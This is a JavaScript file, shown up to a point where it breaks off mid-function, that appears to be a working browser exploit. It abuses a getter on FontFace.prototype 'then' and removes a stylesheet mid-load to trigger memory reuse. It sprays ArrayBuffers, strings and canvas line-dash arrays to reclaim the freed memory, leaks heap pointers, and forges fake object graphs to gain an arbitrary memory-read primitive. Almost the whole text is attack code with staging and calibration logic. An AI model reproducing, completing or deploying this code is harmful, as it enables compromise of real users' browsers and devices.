//#region Constants
const FACE_CARRIER_COUNT = 2000;
const STREAM_PAIR_COUNT = 1700;
const STRING_CHAR_COUNT = 60;
const HASH_TABLE_OFFSET = 28;
const HASH_TABLE_SIZE = 0x00400000;

const EARLY_STRING_INDEX = GEOMETRY.early_string_index;
const EARLY_DASH_INDEX = GEOMETRY.early_dash_index;
const WINNER_ANCHOR = GEOMETRY.winner_anchor;
const STAGE_BIAS_CELLS = GEOMETRY.stage_bias_cells;

const PAGE_SIZE = 0x4000;
const CHUNK_SIZE = 0x100000;
const MARKER_OFFSET = 40;

const FACE_REF_OFFSET = 0;
const PROPERTY_POINTER_OFFSET = 8;
const PROPERTY_TAG_OFFSET = 16;
const FAMILY_OFFSET = 24;
const RANGE_POINTER_OFFSET = 32;
const RANGE_CAPACITY_OFFSET = 40;
const RANGE_SIZE_OFFSET = 44;
const LOAD_BEHAVIOR_OFFSET = 64;
const SOURCE_POINTER_OFFSET = 72;
const SOURCE_CAPACITY_OFFSET = 80;
const SOURCE_SIZE_OFFSET = 84;
const TABLE_OFFSET = 88;
const OP_COUNT_OFFSET = 96;
const MAX_OP_OFFSET = 100;
const WRAPPER_OFFSET = 104;
const STATUS_OFFSET = 130;
const OVERRIDE_OFFSET = 135;
const ID_OFFSET = 168;

const PACK_NODE_A = 80;
const PACK_NODE_C = 104;
const PACK_NODE_V = 120;
const PACK_NODE_B = 136;
const PACK_REGION_END = 156;

const SPLIT_LEN = 16;
const SPLIT_FLAGS = 0x00100004;

const STAGE_MARKERS = [
  0x000a1101, 0x000a2202, 0x000a3303, 0x000a4404, 0x000a5505, 0x000a6606, 0x000a7707, 0x000a8808, 0x000a9909, 0x000aaa0a, 0x000abb0b, 0x000acc0c,
];
const STAGE_MARKERS_2 = [
  0x000f4454, 0x000f7757, 0x000f6656, 0x000f1151, 0x000f2252, 0x000f3353, 0x000f8858, 0x000f9959, 0x000faa5a, 0x000fbb5b, 0x000fcc5c, 0x000fdd5d,
];
const STAGE_NAMES = ['SV1', 'SC1', 'SA1', 'SV2', 'SC2', 'SA2', 'DV1', 'DC1', 'DA1', 'DV2', 'DC2', 'DA2'];

const BIT_BUFFER = new ArrayBuffer(8);
const BIT_U32 = new Uint32Array(BIT_BUFFER);
const BIT_F64 = new Float64Array(BIT_BUFFER);

const KEY_NONCE = (((Date.now() >>> 0) & 0x7ff) << 1) >>> 0;
const BASE0_LOW = 0x00000000;
const BASE0_HIGH = (0x00100000 + KEY_NONCE) >>> 0;
const HIT0_LOW = 0x00000000;
const HIT0_HIGH = (BASE0_HIGH + 1) >>> 0;
const BASE1_LOW = 0x00000000;
const BASE1_HIGH = 0x00400000;

const DASH = [
  float64_from_bits(BASE0_LOW, BASE0_HIGH),
  float64_from_bits(BASE1_LOW, BASE1_HIGH),
  0,
  0,
  float64_from_bits(BASE0_LOW, BASE0_HIGH),
  float64_from_bits(BASE1_LOW, BASE1_HIGH),
  0,
  0,
  0,
  0,
];
const FAKE_PROPERTIES = [float64_from_bits(0x00000100, 0x00100008), 0, 0, 0, 0, 0, 0, 0, 0, 0];

const BEACON_CAPACITY = 128;
//#endregion

//#region State
const carrier_views = new Array(FACE_CARRIER_COUNT);
const carrier_contexts = [];
const control_views = [];
const spray_strings = [];
let stage_strings = [];
const font_sets = [];

let carrier_fill = 0;
let probe_face = null;
let loaded_faces = null;
let target = null;
let winner = -1;
let winner_view = null;

let then_getter_fired = false;
let then_job_executed = false;
let resolved = false;
let scan_started = false;
let terminal = false;
let victim_table = 0;

let early_winner = -1;
let early_real_table = 0;
let early_wrapper = 0;
let early_plans = null;
let early_error = '';

let early_string_index = EARLY_STRING_INDEX;
let early_dash_index = EARLY_DASH_INDEX;

const BEACON_TAGS = new Array(BEACON_CAPACITY);
const BEACON_DATA = new Array(BEACON_CAPACITY);
let beacon_count = 0;

const tchars = new Array(STRING_CHAR_COUNT);
for (let i = 0; i < STRING_CHAR_COUNT; i++) tchars[i] = expected_char(i, 0);

let started = false;
let resolve_userland = undefined;
const userland_done = new Promise((resolve) => {
  resolve_userland = resolve;
});
//#endregion

//#region Bytes

function float64_from_bits(lo, hi) {
  BIT_U32[0] = lo >>> 0;
  BIT_U32[1] = hi >>> 0;
  return BIT_F64[0];
}
function float64_bits(x) {
  BIT_F64[0] = x;
  return { lo: BIT_U32[0] >>> 0, hi: BIT_U32[1] >>> 0 };
}
function bits_match(b, lo, hi) {
  return b.lo === lo >>> 0 && b.hi === hi >>> 0;
}
function bucket_ok(b) {
  return bits_match(b, 0, 0) || b.hi === 0x00000010;
}
function hex32(x) {
  return ('00000000' + (x >>> 0).toString(16)).slice(-8);
}

function put32(v, off, x) {
  for (let j = 0; j < 4; j++) v[off + j] = (x >>> (8 * j)) & 255;
}
function put64(v, off, x) {
  for (let j = 0; j < 8; j++) v[off + j] = Math.floor(x / Math.pow(256, j)) % 256;
}
function read_uint32(v, off) {
  return (v[off] | (v[off + 1] << 8) | (v[off + 2] << 16) | (v[off + 3] << 24)) >>> 0;
}
function read_qword(v, off) {
  return read_uint32(v, off) + read_uint32(v, off + 4) * 4294967296;
}
function has_non_zero(v, off) {
  for (let j = 0; j < 8; j++) if (v[off + j] !== 0) return true;
  return false;
}
function hex_qword(v, off) {
  let s = '';
  for (let j = 7; j >= 0; j--) s += ('00' + v[off + j].toString(16)).slice(-2);
  return '0x' + s;
}
function hex64(x) {
  let s = '';
  for (let j = 7; j >= 0; j--) {
    const b = Math.floor(x / Math.pow(256, j)) % 256;
    s += ('00' + b.toString(16)).slice(-2);
  }
  return s;
}

function ptr_at(v, i) {
  if (i < 0 || i + 7 >= v.length || v[i + 4] !== 0x10 || v[i + 5] || v[i + 6] || v[i + 7]) return false;
  return (v[i] | v[i + 1] | v[i + 2] | v[i + 3]) !== 0;
}
function ptr_at_string(s, i) {
  if (i < 0 || i + 7 >= s.length || s.charCodeAt(i + 4) !== 0x10 || s.charCodeAt(i + 5) || s.charCodeAt(i + 6) || s.charCodeAt(i + 7)) return false;
  return (s.charCodeAt(i) | s.charCodeAt(i + 1) | s.charCodeAt(i + 2) | s.charCodeAt(i + 3)) !== 0;
}
function bytes8_string(s, i) {
  let out = '';
  for (let j = 7; j >= 0; j--) out += ('00' + s.charCodeAt(i + j).toString(16)).slice(-2);
  return '0x' + out;
}

function string_bytes(s) {
  const a = new Array(STRING_CHAR_COUNT);
  for (let i = 0; i < STRING_CHAR_COUNT; i++) a[i] = s.charCodeAt(i) & 255;
  return a;
}
function bytes_equal(a, b) {
  if (!a || !b || a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}
function hex_bytes(a) {
  let s = '';
  for (let i = 0; i < a.length; i++) s += ('00' + (a[i] & 255).toString(16)).slice(-2);
  return s;
}

function snapshot_carrier() {
  const a = new Array(winner_view.length);
  for (let i = 0; i < a.length; i++) a[i] = winner_view[i];
  return a;
}
function restore_carrier(a) {
  for (let i = 0; i < a.length; i++) winner_view[i] = a[i];
}
function carrier_matches(a) {
  if (!a || a.length !== winner_view.length) return false;
  for (let i = 0; i < a.length; i++) if (winner_view[i] !== a[i]) return false;
  return true;
}

function is_heap_pointer(x) {
  return x >= 0x1000000000 && x < 0x1003000000 && x % 8 === 0;
}

function is_module_base(x) {
  return x >= 0x800000000 && x < 0x900000000 && x % 0x4000 === 0;
}

//#endregion

//#region Geometry
function page_base_of(x) {
  return x - (x % 0x4000);
}
function make_phase_plan(branch, page0, idx) {
  const dash_phase = branch === 'dash';
  const ordinal = (dash_phase ? 1 + 2 * (STREAM_PAIR_COUNT - idx) : 2 + 2 * (STREAM_PAIR_COUNT - idx)) + STAGE_BIAS_CELLS;
  const page_steps = Math.floor(ordinal / 204),
    next_slot = ordinal % 204;
  const alloc_base = page0 - page_steps * PAGE_SIZE + next_slot * 80;
  const graph_skip = dash_phase ? 6 : 0,
    graph_base = alloc_base + graph_skip * 80;
  const bases = [],
    payloads = [],
    all_bases = [];
  for (let i = 0; i < 6; i++) {
    bases.push(graph_base + i * 80);
    payloads.push(graph_base + i * 80 + 20);
  }
  for (let i = 0; i < 12; i++) all_bases.push(alloc_base + i * 80);
  return {
    branch: branch,
    cal_index: idx,
    winner: -1,
    victim_table: 0,
    wrapper: 0,
    all_chars: null,
    page0: page0,
    slot0: page0 + 0xa0,
    ordinal: ordinal,
    page_steps: page_steps,
    next_slot: next_slot,
    alloc_base: alloc_base,
    graph_skip: graph_skip,
    bases: bases,
    payloads: payloads,
    all_bases: all_bases,
    packed_properties: page0 + 0xa0 + (dash_phase ? 0x280 : 0x2d0),
    packed_source: page0 + 0xa0 + (dash_phase ? 0x320 : 0x370),
  };
}
function same_phase_plan(a, b) {
  if (
    !a ||
    !b ||
    a.branch !== b.branch ||
    a.cal_index !== b.cal_index ||
    a.page0 !== b.page0 ||
    a.slot0 !== b.slot0 ||
    a.ordinal !== b.ordinal ||
    a.page_steps !== b.page_steps ||
    a.next_slot !== b.next_slot ||
    a.alloc_base !== b.alloc_base ||
    a.graph_skip !== b.graph_skip ||
    a.packed_properties !== b.packed_properties ||
    a.packed_source !== b.packed_source
  )
    return false;
  for (let i = 0; i < 6; i++) if (a.bases[i] !== b.bases[i] || a.payloads[i] !== b.payloads[i]) return false;
  for (let i = 0; i < 12; i++) if (a.all_bases[i] !== b.all_bases[i]) return false;
  return true;
}

//#endregion

//#region Encoders
function split_tail_dash(target_ptr) {
  const lo = Math.floor(target_ptr % 4294967296) >>> 0,
    hi = Math.floor(target_ptr / 4294967296) >>> 0;
  const q0 = float64_from_bits(SPLIT_LEN, lo),
    q1 = float64_from_bits(hi, SPLIT_FLAGS);
  if (
    !(q0 > 0) ||
    !(q1 > 0) ||
    !isFinite(q0) ||
    !isFinite(q1) ||
    !bits_match(float64_bits(q0), SPLIT_LEN, lo) ||
    !bits_match(float64_bits(q1), hi, SPLIT_FLAGS)
  )
    return null;
  return [q0, q1, 0, 0, 0, 0, 0, 0, 0, 0];
}
function exact_split_tail(a, target_ptr) {
  if (!a || a.length !== 10) return false;
  const lo = Math.floor(target_ptr % 4294967296) >>> 0,
    hi = Math.floor(target_ptr / 4294967296) >>> 0;
  if (!bits_match(float64_bits(a[0]), SPLIT_LEN, lo) || !bits_match(float64_bits(a[1]), hi, SPLIT_FLAGS)) return false;
  for (let i = 2; i < 10; i++) if (!bits_match(float64_bits(a[i]), 0, 0)) return false;
  return true;
}

function blank_stage(marker, marker2, tag) {
  const a = new Array(STRING_CHAR_COUNT);
  for (let i = 0; i < STRING_CHAR_COUNT; i++) a[i] = 0;
  put32(a, MARKER_OFFSET, marker);
  put32(a, MARKER_OFFSET + 4, marker);
  put32(a, MARKER_OFFSET + 8, marker2);
  put32(a, MARKER_OFFSET + 12, marker2);
  put32(a, 56, tag >>> 0);
  return a;
}
function graph_v_chars(BP, mi) {
  const a = blank_stage(STAGE_MARKERS[mi], STAGE_MARKERS_2[mi], 0x52560032 + mi);
  put32(a, 0, 0x100);
  put32(a, 4, 20);
  put64(a, 8, BP);
  return a;
}
function graph_c_chars(VP, mi) {
  const a = blank_stage(STAGE_MARKERS[mi], STAGE_MARKERS_2[mi], 0x52430033 + mi);
  put32(a, 0, 0x74);
  put64(a, 8, VP);
  return a;
}
function graph_a_chars(CP, mi) {
  const a = blank_stage(STAGE_MARKERS[mi], STAGE_MARKERS_2[mi], 0x52410034 + mi);
  put32(a, 0, 0x100);
  put32(a, 4, 0x00100008);
  put64(a, 8, CP);
  put32(a, 16, 4);
  put32(a, 20, 1);
  return a;
}

function only_v_cached_bit_changed(before, after) {
  if (!before || !after || before.length !== STRING_CHAR_COUNT || after.length !== STRING_CHAR_COUNT) return false;
  for (let i = 0; i < STRING_CHAR_COUNT; i++) {
    let want = before[i];
    if (i === 4) want |= 0x80;
    if (after[i] !== want) return false;
  }
  return true;
}

function decode_css_string(sv) {
  const out = [];
  const n = sv.length;
  if (n < 2 || sv.charCodeAt(0) !== 34 || sv.charCodeAt(n - 1) !== 34) return null;
  let i = 1;
  while (i < n - 1) {
    let c = sv.charCodeAt(i++);
    if (c !== 92) {
      out.push(c & 255);
      continue;
    }
    if (i >= n - 1) return null;
    c = sv.charCodeAt(i);
    let v = 0,
      k = 0;
    while (i < n - 1 && k < 6) {
      c = sv.charCodeAt(i);
      const d = c >= 48 && c <= 57 ? c - 48 : c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : -1;
      if (d < 0) break;
      v = v * 16 + d;
      i++;
      k++;
    }
    if (k) {
      if (i < n - 1) {
        c = sv.charCodeAt(i);
        if (c === 32 || c === 9 || c === 10 || c === 12 || c === 13) i++;
      }
      out.push(v & 255);
    } else out.push(sv.charCodeAt(i++) & 255);
  }
  return out;
}
function scalar_string(cp) {
  return cp <= 0xffff ? String.fromCharCode(cp) : String.fromCharCode(0xd800 + ((cp - 0x10000) >>> 10), 0xdc00 + ((cp - 0x10000) & 0x3ff));
}
function exact_fake_properties(a) {
  if (!a || a.length !== 10 || !bits_match(float64_bits(a[0]), 0x00000100, 0x00100008)) return false;
  for (let i = 1; i < 10; i++) if (!bits_match(float64_bits(a[i]), 0, 0)) return false;
  return true;
}

function pack_read_graph(base, address, length) {
  for (let i = PACK_NODE_A; i < PACK_REGION_END; ++i) winner_view[i] = 0;
  put32(winner_view, PACK_NODE_A, 0x100);
  put32(winner_view, PACK_NODE_A + 4, 0x00100008);
  put64(winner_view, PACK_NODE_A + 8, base + PACK_NODE_C);
  put32(winner_view, PACK_NODE_A + 16, 4);
  put32(winner_view, PACK_NODE_A + 20, 1);
  put32(winner_view, PACK_NODE_C, 0x74);
  put64(winner_view, PACK_NODE_C + 8, base + PACK_NODE_V);
  put32(winner_view, PACK_NODE_V, 0x100);
  put32(winner_view, PACK_NODE_V + 4, 20);
  put64(winner_view, PACK_NODE_V + 8, base + PACK_NODE_B);
  put32(winner_view, PACK_NODE_B, 0x01000100);
  put32(winner_view, PACK_NODE_B + 4, length);
  put64(winner_view, PACK_NODE_B + 8, address);
  put32(winner_view, PACK_NODE_B + 16, 0x00100004);
  put64(winner_view, PROPERTY_POINTER_OFFSET, base + PACK_NODE_A);
  put64(winner_view, PROPERTY_TAG_OFFSET, 0);
}
function exact_packed_graph(base, target_ptr, length = 16) {
  return (
    read_uint32(winner_view, PACK_NODE_A) === 0x100 &&
    read_uint32(winner_view, PACK_NODE_A + 4) === 0x00100008 &&
    read_qword(winner_view, PACK_NODE_A + 8) === base + PACK_NODE_C &&
    read_uint32(winner_view, PACK_NODE_A + 16) === 4 &&
    read_uint32(winner_view, PACK_NODE_A + 20) === 1 &&
    read_uint32(winner_view, PACK_NODE_C) === 0x74 &&
    read_qword(winner_view, PACK_NODE_C + 8) === base + PACK_NODE_V &&
    read_uint32(winner_view, PACK_NODE_V) === 0x100 &&
    read_uint32(winner_view, PACK_NODE_V + 4) === 20 &&
    read_qword(winner_view, PACK_NODE_V + 8) === base + PACK_NODE_B &&
    read_uint32(winner_view, PACK_NODE_B) === 0x01000100 &&
    read_uint32(winner_view, PACK_NODE_B + 4) === length &&
    read_qword(winner_view, PACK_NODE_B + 8) === target_ptr &&
    read_uint32(winner_view, PACK_NODE_B + 16) === 0x00100004 &&
    read_qword(winner_view, PROPERTY_POINTER_OFFSET) === base + PACK_NODE_A
  );
}
function only_packed_v_cached_bit_changed(before, after) {
  if (!before || !after || before.length !== after.length) return false;
  for (let i = 0; i < before.length; i++) {
    let want = before[i];
    if (i === PACK_NODE_V + 4) want |= 0x80;
    if (after[i] !== want) return false;
  }
  return true;
}

function clear_ranges() {
  put64(winner_view, RANGE_POINTER_OFFSET, 0);
  put32(winner_view, RANGE_CAPACITY_OFFSET, 0);
  put32(winner_view, RANGE_SIZE_OFFSET, 0);
}
function clear_sources() {
  put64(winner_view, SOURCE_POINTER_OFFSET, 0);
  put32(winner_view, SOURCE_CAPACITY_OFFSET, 0);
  put32(winner_view, SOURCE_SIZE_OFFSET, 0);
}
function clear_clients() {
  put64(winner_view, TABLE_OFFSET, 0);
  put32(winner_view, OP_COUNT_OFFSET, 0);
  put32(winner_view, MAX_OP_OFFSET, 512);
}
function configure_map_face(DP) {
  put32(winner_view, FACE_REF_OFFSET, 0x100);
  put64(winner_view, PROPERTY_POINTER_OFFSET, DP);
  put64(winner_view, PROPERTY_TAG_OFFSET, 0);
  put64(winner_view, FAMILY_OFFSET, 0);
  clear_ranges();
  clear_sources();
  clear_clients();
  winner_view[LOAD_BEHAVIOR_OFFSET] = 0;
  winner_view[STATUS_OFFSET] = 0;
  winner_view[OVERRIDE_OFFSET] = 0;
}
function range_exact(font, q, ptr) {
  put64(winner_view, RANGE_POINTER_OFFSET, ptr);
  put32(winner_view, RANGE_CAPACITY_OFFSET, 1);
  put32(winner_view, RANGE_SIZE_OFFSET, 1);
  return font_sets[2].check(font, q.hit) === false && font_sets[2].check(font, q.lo) === true && font_sets[2].check(font, q.hi) === true;
}

//#endregion

//#region Primitive
function expected_char(c, id) {
  const m = c % 32;
  let v = m === 4 || m === 13 ? 1 : 0;
  if (c >= HASH_TABLE_OFFSET - 16 && c <= HASH_TABLE_OFFSET + 7) v = 0;
  if (c === HASH_TABLE_OFFSET - 2) v = 0x40;
  if (c === 55) v = id & 0xff;
  if (c === 56) v = 2;
  if (c >= 57 && c <= 59) v = 0;
  return v;
}
function make_string(id) {
  tchars[55] = id & 0xff;
  spray_strings.push(String.fromCharCode.apply(null, tchars));
}
function find_string_ptr() {
  const hits = [];
  for (let i = 0; i < spray_strings.length && hits.length < 3; i++) {
    const s = spray_strings[i];
    for (let j = 0; j + 7 < STRING_CHAR_COUNT; j++)
      if (ptr_at_string(s, j)) {
        hits.push({ idx: i, off: j, val: bytes8_string(s, j) });
        break;
      }
  }
  return hits;
}
function strings_valid() {
  for (let i = 0; i < spray_strings.length; i++) {
    for (let c = 0; c < STRING_CHAR_COUNT; c++) {
      const exp = expected_char(c, i);
      if (spray_strings[i].charCodeAt(c) !== exp) return { ok: false, idx: i, off: c, got: spray_strings[i].charCodeAt(c), expected: exp };
    }
  }
  return { ok: true };
}
function snapshot_strings() {
  const out = new Array(spray_strings.length * STRING_CHAR_COUNT);
  let p = 0;
  for (let i = 0; i < spray_strings.length; i++) for (let c = 0; c < STRING_CHAR_COUNT; c++) out[p++] = spray_strings[i].charCodeAt(c) & 255;
  return out;
}
function string_delta(before, after) {
  if (!before || !after || before.length !== after.length) return { ok: false, hits: [], why: 'length' };
  const changed = [];
  for (let i = 0; i < spray_strings.length; i++) {
    let diff = false;
    const base = i * STRING_CHAR_COUNT;
    for (let c = 0; c < STRING_CHAR_COUNT; c++)
      if (before[base + c] !== after[base + c]) {
        diff = true;
        break;
      }
    if (diff) changed.push(i);
  }
  if (changed.length === 0) return { ok: true, hits: [] };
  if (changed.length !== 1) return { ok: false, hits: [], why: 'changed-' + changed.length };
  const hits = find_string_ptr();
  if (hits.length !== 1 || hits[0].idx !== changed[0]) return { ok: false, hits: hits, why: 'pointer-count' };
  const h = hits[0],
    b = h.idx * STRING_CHAR_COUNT,
    o = h.off;
  if (o < 16 || o + 7 >= STRING_CHAR_COUNT) return { ok: false, hits: hits, why: 'offset' };
  for (let z = 0; z < 8; z++) if (before[b + o + z] !== 0) return { ok: false, hits: hits, why: 'bucket-pre' };
  if (read_uint32(after, b + o - 16) !== read_uint32(before, b + o - 16)) return { ok: false, hits: hits, why: 'deleted' };
  if (read_uint32(after, b + o - 12) !== (read_uint32(before, b + o - 12) + 1) >>> 0) return { ok: false, hits: hits, why: 'keycount' };
  if (read_uint32(after, b + o - 8) !== read_uint32(before, b + o - 8)) return { ok: false, hits: hits, why: 'mask' };
  if (read_uint32(after, b + o - 4) !== read_uint32(before, b + o - 4)) return { ok: false, hits: hits, why: 'size' };
  for (let c = 0; c < STRING_CHAR_COUNT; c++)
    if (!((c >= o - 12 && c <= o - 9) || (c >= o && c <= o + 7)) && before[b + c] !== after[b + c])
      return { ok: false, hits: hits, why: 'extra-' + c };
  return { ok: true, hits: hits };
}

function make_face_carrier(id) {
  const ab = new ArrayBuffer(192),
    v = new Uint8Array(ab);
  put32(v, MAX_OP_OFFSET, 512);
  v[STATUS_OFFSET] = 3;
  put32(v, ID_OFFSET, (0x63000000 + id) >>> 0);
  carrier_views[carrier_fill] = v;
  carrier_fill++;
}

function init_fontface() {
  for (let pg = 0; pg < STREAM_PAIR_COUNT; pg++) {
    const canvas = document.createElement('canvas');
    canvas.width = 0;
    canvas.height = 0;
    const context = canvas.getContext('2d');
    if (!context) {
      verdict('NO_CARRIER_CONTEXT|idx=' + pg, 'fail');
      return false;
    }
    if (context.getLineDash().length !== 0 || context.lineWidth !== 1) {
      verdict('BAD_EMPTY_CARRIER|idx=' + pg, 'fail');
      return false;
    }
    context.save();
    context.lineWidth = 2;
    context.restore();
    if (context.lineWidth !== 1 || context.getLineDash().length !== 0) {
      verdict('BAD_PREGROWN_CARRIER|idx=' + pg, 'fail');
      return false;
    }
    context.setLineDash(DASH);
    carrier_contexts.push(context);
  }

  for (let q = 0; q < 8; q++) {
    const control = new Uint8Array(new ArrayBuffer(192));
    put32(control, MAX_OP_OFFSET, 512);
    control[STATUS_OFFSET] = 3;
    control_views.push(control);
  }
  if (!controls_valid()) {
    verdict('INVALID_CONTROL_SETUP', 'fail');
    return false;
  }
  try {
    font_sets.push(new FontFaceSet([]));
    font_sets.push(new FontFaceSet([]));
    font_sets.push(new FontFaceSet([]));
  } catch (es) {
    verdict('PREBUILD_SET_EXCEPTION|' + es.name, 'fail');
    return false;
  }

  probe_face = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(probe_face);
  const style_element = document.createElement('style');
  style_element.textContent = '@font-face{font-family:x;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(style_element);
  void probe_face.loaded;
  beacon(
    'BOOT',
    `rev=packed-winnerview-self-read1|arm=trigger|pairs=${STREAM_PAIR_COUNT}|faceSpray=${FACE_CARRIER_COUNT}|backend=classic-bmalloc|earlyStringIdx=${EARLY_STRING_INDEX}|earlyDashIdx=${EARLY_DASH_INDEX}|stageBiasCells=${STAGE_BIAS_CELLS}|keyNonce=0x${hex32(BASE0_HIGH)}`,
  );
  beacon(
    'SETUP',
    `independentContexts=${carrier_contexts.length}|pregrown=1|dash=10|headers=0,32|sets=3|getterPairs=1700|thenStages=12|postChecks=72|controls=ok`,
  );
  fail_after(120000);

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function () {
      if (then_getter_fired || terminal) return undefined;
      then_getter_fired = true;
      const then_face = this;
      try {
        style_element.parentNode.removeChild(style_element);
      } catch (e) {
        verdict('STYLE_REMOVE_EXCEPTION|' + e.name, 'fail');
        return undefined;
      }
      try {
        document.body.offsetHeight;
      } catch (e2) {
        verdict('LAYOUT_EXCEPTION|' + e2.name, 'fail');
        return undefined;
      }
      for (let s = 0; s < FACE_CARRIER_COUNT; s++) make_face_carrier(s);

      for (let t = 0; t < STREAM_PAIR_COUNT; t++) {
        make_string(t);
        carrier_contexts[t].save();
        carrier_contexts[t].lineWidth = 2;
      }

      return function (resolve, reject) {
        if (then_job_executed || terminal) {
          try {
            if (typeof resolve === 'function') resolve(then_face);
          } catch (e3) {}
          return;
        }
        then_job_executed = true;
        try {
          early_winner = find_winner();
          if (early_winner < 0) early_error = 'THENABLE_WINNER_MISS';
          else {
            winner_view = carrier_views[early_winner];
            early_real_table = read_qword(winner_view, TABLE_OFFSET);
            early_wrapper = read_qword(winner_view, WRAPPER_OFFSET);
            if (early_real_table < 0x1000000000 || early_real_table > 0x1002000000) early_error = 'THENABLE_TABLE_RANGE';
            else if (early_wrapper < 0x1000000000 || early_wrapper > 0x1002000000) early_error = 'THENABLE_WRAPPER_RANGE';
            else {
              const winner_delta = early_winner - WINNER_ANCHOR;
              const table_offset = early_real_table & 0x3fff;
              const table_shift = Math.max(-6, Math.min(6, Math.floor((0x3850 - table_offset) / 0x140) * 2));
              early_string_index = EARLY_STRING_INDEX - winner_delta + table_shift;
              early_dash_index = EARLY_DASH_INDEX - winner_delta + table_shift;
              const page0 = page_base_of(early_real_table) + 0x4000;
              const string_plan = make_phase_plan('string', page0, early_string_index),
                dash_plan = make_phase_plan('dash', page0, early_dash_index);
              const chunk = early_real_table - (early_real_table % CHUNK_SIZE);
              const string_last = string_plan.all_bases[11] + 80,
                dash_last = dash_plan.all_bases[11] + 80;
              if (
                string_plan.alloc_base < chunk + PAGE_SIZE ||
                dash_plan.alloc_base < chunk + PAGE_SIZE ||
                string_last > chunk + CHUNK_SIZE ||
                dash_last > chunk + CHUNK_SIZE ||
                page_base_of(string_plan.alloc_base) !== page_base_of(string_plan.all_bases[11]) ||
                page_base_of(dash_plan.alloc_base) !== page_base_of(dash_plan.all_bases[11])
              )
                early_error = 'THENABLE_STAGE_BOUNDS';
              else {
                const chars = [
                  graph_v_chars(string_plan.packed_source - 4, 0),
                  graph_c_chars(string_plan.payloads[0], 1),
                  graph_a_chars(string_plan.payloads[1], 2),
                  graph_v_chars(string_plan.packed_source - 4, 3),
                  graph_c_chars(string_plan.payloads[3], 4),
                  graph_a_chars(string_plan.payloads[4], 5),
                  graph_v_chars(dash_plan.packed_source - 4, 6),
                  graph_c_chars(dash_plan.payloads[0], 7),
                  graph_a_chars(dash_plan.payloads[1], 8),
                  graph_v_chars(dash_plan.packed_source - 4, 9),
                  graph_c_chars(dash_plan.payloads[3], 10),
                  graph_a_chars(dash_plan.payloads[4], 11),
                ];
                const stage_sv1 = String.fromCharCode.apply(null, chars[0]);
                const stage_sc1 = String.fromCharCode.apply(null, chars[1]);
                const stage_sa1 = String.fromCharCode.apply(null, chars[2]);
                const stage_sv2 = String.fromCharCode.apply(null, chars[3]);
                const stage_sc2 = String.fromCharCode.apply(null, chars[4]);
                const stage_sa2 = String.fromCharCode.apply(null, chars[5]);
                const stage_dv1 = String.fromCharCode.apply(null, chars[6]);
                const stage_dc1 = String.fromCharCode.apply(null, chars[7]);
                const stage_da1 = String.fromCharCode.apply(null, chars[8]);
                const stage_dv2 = String.fromCharCode.apply(null, chars[9]);
                const stage_dc2 = String.fromCharCode.apply(null, chars[10]);
                const stage_da2 = String.fromCharCode.apply(null, chars[11]);
                stage_strings = [
                  stage_sv1,
                  stage_sc1,
                  stage_sa1,
                  stage_sv2,
                  stage_sc2,
                  stage_sa2,
                  stage_dv1,
                  stage_dc1,
                  stage_da1,
                  stage_dv2,
                  stage_dc2,
                  stage_da2,
                ];
                let content_ok = stage_strings.length === 12;
                for (let si = 0; content_ok && si < 12; si++) content_ok = bytes_equal(string_bytes(stage_strings[si]), chars[si]);
                if (!content_ok) early_error = 'THENABLE_STAGE_CONTENT';
                else {
                  string_plan.winner = dash_plan.winner = early_winner;
                  string_plan.victim_table = dash_plan.victim_table = early_real_table;
                  string_plan.wrapper = dash_plan.wrapper = early_wrapper;
                  string_plan.all_chars = dash_plan.all_chars = chars;
                  early_plans = { string: string_plan, dash: dash_plan };
                }
              }
            }
          }
        } catch (e4) {
          early_error = 'THENABLE_JOB_' + e4.name;
        }
        if (!early_error && !terminal)
          beacon(
            'MIX_DONE',
            `strings=${spray_strings.length}|copies=${STREAM_PAIR_COUNT}|order=S,D|thenJob=1|stages=12|stringBase=0x${hex64(early_plans.string.alloc_base)}|dashBase=0x${hex64(early_plans.dash.alloc_base)}`,
          );
        try {
          if (typeof resolve === 'function') resolve(then_face);
          else early_error = early_error || 'THENABLE_NO_RESOLVE';
        } catch (e5) {
          early_error = early_error || 'THENABLE_RESOLVE_' + e5.name;
        }
      };
    },
  });

  return true;
}

//#endregion

//#region Calibration
function controls_valid() {
  for (let i = 0; i < control_views.length; i++) {
    const v = control_views[i];
    if (
      has_non_zero(v, TABLE_OFFSET) ||
      has_non_zero(v, WRAPPER_OFFSET) ||
      read_uint32(v, OP_COUNT_OFFSET) !== 0 ||
      read_uint32(v, MAX_OP_OFFSET) !== 512 ||
      v[STATUS_OFFSET] !== 3
    )
      return false;
  }
  return true;
}

function disarm_face() {
  if (!winner_view) return;
  put64(winner_view, SOURCE_POINTER_OFFSET, 0);
  put32(winner_view, SOURCE_CAPACITY_OFFSET, 0);
  put32(winner_view, SOURCE_SIZE_OFFSET, 0);
  put64(winner_view, TABLE_OFFSET, 0);
  put32(winner_view, OP_COUNT_OFFSET, 0);
  put32(winner_view, MAX_OP_OFFSET, 512);
  winner_view[LOAD_BEHAVIOR_OFFSET] = 0;
  winner_view[STATUS_OFFSET] = 4;
  winner_view[OVERRIDE_OFFSET] = 0;
}
function prepare_face(t) {
  disarm_face();
  if (!winner_view) return;
  put64(winner_view, TABLE_OFFSET, t);
}
function add_with(set_index, tag, t) {
  beacon(tag + '_ENTER', 'set=' + set_index + '|table=0x' + hex64(t));
  prepare_face(t);
  const op_before = read_uint32(winner_view, OP_COUNT_OFFSET);
  let err = null;
  let table_now = '';
  let op = 0;
  if (op_before !== 0) {
    verdict(tag + '_OP_PRE_NOT_ZERO|op=' + op_before, 'fail');
    return false;
  }
  try {
    font_sets[set_index].add(target);
  } catch (e) {
    err = e;
  }
  try {
    table_now = hex_qword(winner_view, TABLE_OFFSET);
    op = read_uint32(winner_view, OP_COUNT_OFFSET);
  } catch (e2) {
    err = err || e2;
  }
  disarm_face();
  beacon(tag + '_EXIT', 'tableNow=' + table_now + '|opBefore=' + op_before + '|opAfter=' + op + '|disarmed=1');
  if (err) {
    verdict(tag + '_EXCEPTION|' + err.name, 'fail');
    return false;
  }
  if (table_now !== '0x' + hex64(t)) {
    verdict(tag + '_TABLE_REPLACED|now=' + table_now, 'fail');
    return false;
  }
  if (op !== 1) {
    verdict(tag + '_OP_NOT_ONE|op=' + op, 'fail');
    return false;
